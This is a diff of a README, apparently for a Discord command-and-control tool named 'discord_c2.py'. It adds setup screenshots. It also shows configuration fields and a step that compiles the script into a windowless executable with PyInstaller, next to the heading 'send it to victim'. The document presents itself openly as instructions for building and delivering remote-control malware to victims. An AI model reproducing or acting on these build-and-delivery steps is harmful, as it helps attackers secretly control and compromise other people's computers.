@@ -87,6 +87,15 @@ https://discord.com/developers/applications
 <img width="1918" height="1006" alt="Screenshot 2026-05-08 152139" src="https://github.com/user-attachments/assets/a4f2674a-6bda-45f8-ae3b-64342311f45f" />
 
 
+<img width="1900" height="994" alt="Screenshot 2026-05-08 154157" src="https://github.com/user-attachments/assets/e9f02fd2-7776-4b7a-84e0-f1c4d54353b7" />
+
+
+<img width="1909" height="1000" alt="Screenshot 2026-05-08 154826" src="https://github.com/user-attachments/assets/9b2e04e5-6d3e-4d1c-af06-65491d253355" />
+
+
+<img width="1909" height="982" alt="Screenshot 2026-05-08 154921" src="https://github.com/user-attachments/assets/e0270dbd-199f-4262-a075-119584ec4230" />
+
+
 
 # ✅ How to Use 
 
@@ -120,7 +129,15 @@ CHANNEL_ID = 123456789012345678            # integer, channel ID where bot liste
 
 ALLOWED_USER_IDS = [987654321098765432]    # your Discord user ID(s)
 
+
+
+<img width="1915" height="1003" alt="Screenshot 2026-05-08 155205" src="https://github.com/user-attachments/assets/e071cfd7-ac76-419c-a9cd-345ebd5ecb77" />
+
+
+
 # COMPILE IT INTO AN EXE BY USING PYINSTALLER And send it to victim:
+
+# In Terminal same Folder:
 
 Command = ` pyinstaller --noconsole --onefile --icon=Icon1.ico discord_c2.py `
 
